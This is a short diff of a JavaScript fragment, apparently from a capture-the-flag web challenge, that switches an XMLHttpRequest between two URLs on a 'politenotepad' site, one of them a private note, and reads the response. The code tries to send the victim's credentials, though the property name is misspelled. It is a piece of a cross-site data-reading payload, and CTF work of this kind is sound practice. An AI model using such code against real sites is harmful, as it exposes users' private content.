@@ -1,8 +1,8 @@
 var req = new XMLHttpRequest();
 //step1
-//req.open("GET", "http://politenotepad.zajebistyc.tf/", false);
+req.open("GET", "http://politenotepad.zajebistyc.tf/", false);
 //step2
-req.open("GET", "http://politenotepad.zajebistyc.tf/note/NMRqFJTnDDkjUbRAmmQuJhtdKmQdfm", false);
+//req.open("GET", "http://politenotepad.zajebistyc.tf/note/NMRqFJTnDDkjUbRAmmQuJhtdKmQdfm", false);
 req.witthCredentials = true;
 req.send(null)
 var res = req.responseText;
